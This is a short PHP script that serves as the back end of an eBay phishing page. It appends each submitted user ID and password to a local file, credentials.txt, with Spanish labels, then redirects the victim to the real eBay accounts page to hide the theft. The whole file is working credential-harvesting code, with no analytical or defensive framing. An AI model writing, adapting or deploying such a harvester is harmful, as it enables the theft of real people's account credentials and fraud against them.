<?php

file_put_contents("credentials.txt", "[+] Ebay -> Usuario: " . $_POST['userid'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
?>
